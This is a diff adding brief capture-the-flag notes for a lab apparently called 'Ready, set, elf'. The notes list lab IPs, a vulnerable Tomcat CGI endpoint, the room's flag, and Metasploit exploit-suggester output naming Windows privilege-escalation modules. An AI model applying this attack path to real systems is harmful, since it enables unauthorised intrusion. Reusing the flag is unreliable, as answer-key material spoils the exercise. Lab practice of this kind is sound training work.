@@ -1,0 +1,28 @@
+Ready, set, elf. - Networking
+
+attack ip: 10.9.215.98
+target ip: 10.10.232.11
+
+Apache Tomcat/9.0.17
+
+http://10.10.232.11/cgi-bin/elfwhacker.bat
+
+C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin
+
+thm{whacking_all_the_elves}
+
+Elfwhacker.exe - service
+C:\Program Files\TBFC APPS\Elf Whacker\Elfwhacker.exe
+
+
+multi/recon/local_exploit_suggester
+
+[*] 10.10.232.11 - Collecting local exploits for x86/windows...
+[*] 10.10.232.11 - 35 exploit checks are being tried...
+[+] 10.10.232.11 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.10.232.11 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[-] 10.10.232.11 - Post interrupted by the console user
+[*] Post module execution completed
+
+
+exploit/windows/local/cve_2020_1048_printerdemon
